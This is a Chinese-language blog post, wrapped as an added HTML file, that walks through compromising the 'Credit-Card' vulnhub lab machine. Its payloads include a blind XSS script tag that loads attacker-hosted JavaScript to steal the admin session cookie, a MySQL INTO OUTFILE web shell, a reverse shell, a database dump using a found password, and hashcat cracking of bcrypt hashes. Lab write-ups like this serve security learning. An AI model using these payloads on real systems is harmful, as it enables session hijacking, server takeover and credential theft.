@@ -1,0 +1,83 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Credit-Card-vulnhub渗透测试"><meta name="keywords" content="渗透测试"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>Credit-Card-vulnhub渗透测试 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透过程"><span class="toc-number">2.</span> <span class="toc-text">渗透过程</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">71</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Credit-Card-vulnhub渗透测试</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-28</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>扫目录时一定要多用几个扫描器扫…..</p>
+<p>不然会去世…..</p>
+<a id="more"></a>
+
+<p>考点：</p>
+<p>​    xss反弹cookie</p>
+<p>​    hashcat 爆破密码</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>​    靶机IP地址：192.168.1.112</p>
+<p>​    Kali地址：192.168.1.76</p>
+<p>​    扫描靶机的IP，看看靶机的端口开了哪些</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -Pn <span class="number">192.168</span><span class="number">.1</span><span class="number">.112</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="image-20200528090400499"></p>
+<p>​    这里扫出来的端口有22,80,443,9090端口。</p>
+<p>​    443端口测试后，无法突破，所以把重点放在80端口和22端口。 </p>
+<p>​    我用dirb，御剑，dirsearch扫描目录，用dirsearch才扫描出了后台，所以要有好的字典。</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="image-20200528092853359"></p>
+<p>​    在<code>_admin</code>中点击<code>dist</code>然后会跳转到</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="image-20200528092945455"></p>
+<p>​    这里我使用top10的弱口令不行，然后爆破密码也没有成功……</p>
+<p>​    想了很久，burp抓包的时候，注意到这个</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="image-20200528093541690"></p>
+<p>​    这个<code>PHPSESSID</code>相当可以，考虑到我们或许可以想办法获取到管理员的会话ID之类的。</p>
+<p>​    访问<code>index.html</code>，这里没有什么东西，但是到<code>buynow.php</code></p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="image-20200528094706888"></p>
+<p>这里可能会有xss</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/scirpit&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是用这个最简单的语句我弹了半天，什么都没有弹出来，可能这里是没有回显的那种。</p>
+<p>本地搭一个反弹xss的脚本,参考<a href="https://www.jianshu.com/p/0f5974c386cb" target="_blank" rel="noopener">https://www.jianshu.com/p/0f5974c386cb</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://192.168.1.9/xss/hacker.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" alt="image-20200528095505922"></p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="image-20200528095532738"></p>
+<p>​    反弹出<code>admin用户</code>的会话ID</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" alt="image-20200528095638847"></p>
+<p>​    </p>
+<p>​    登陆到后台后记得每一步都要更换PHPSESSID</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" alt="image-20200528095804999"></p>
+<p>​    尝试Mysql写shell</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png" alt="image-20200528100056786"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">"&lt;?php echo system($_GET['cmd']); ?&gt;"</span> into outfile <span class="string">'/var/www/html/shell.php'</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功写入shell</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" alt="image-20200528100227303"></p>
+<p>然后反弹shell，kali监听7777端口。</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.png" alt="image-20200528100410807"></p>
+<p>但是用7777端口不能反弹shell，阴差阳错下试了一下443端口，发现443端口可以</p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13.png" alt="image-20200528100553465"></p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png" alt="image-20200528100859444"></p>
+<p>​    在home中发现有两个用户，一个是<code>moneygrabber</code>，想起之前的22端口，现在要做的就是找到<code>moneygrabber</code>的密码，可能ssh用的上。</p>
+<p>​    </p>
+<p>​    在web目录下寻找信息，发现<code>config.php</code></p>
+<p>​    <img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png" alt="image-20200528171408382"></p>
+<p>​    这里是用于连接数据库的数据，所以尝试获取数据库的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uorders -pOb2UA15ubBtzpZrvdMYT -e "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span><span class="string">" orders &gt;2.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16.png" alt="image-20200528172701247"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">userID  userName        password</span><br><span class="line"><span class="number">1</span>       admin   $<span class="number">2</span>y$<span class="number">12</span>$A4jqwtWB73.TAMIeplx0T<span class="number">.5</span>oG/mnHR1qTDa8cmtTIvW3ZTjdSjdjC</span><br><span class="line"><span class="number">2</span>       m0n3y6r4bb3r    $<span class="number">2</span>y$<span class="number">12</span>$EX/FDsztTMwftzPRyY8gFuM7ZjAphQRZs88qpZpmboRogOAOYXowC</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a <span class="number">0</span>  -m <span class="number">3200</span> test.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17.png" alt="image-20200528182735575"></p>
+<p><img src="/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18.png" alt="image-20200528182839557"></p>
+<p>然后flag3暂时提权不怎么会…..</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">http://yoursite.com/2020/05/28/Credit-Card-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/05/25/CVE-2020-9484-Tomcat-cluster-sync-session-%E5%A4%8D%E7%8E%B0/"><span>CVE-2020-9484(Tomcat cluster sync-session)复现</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
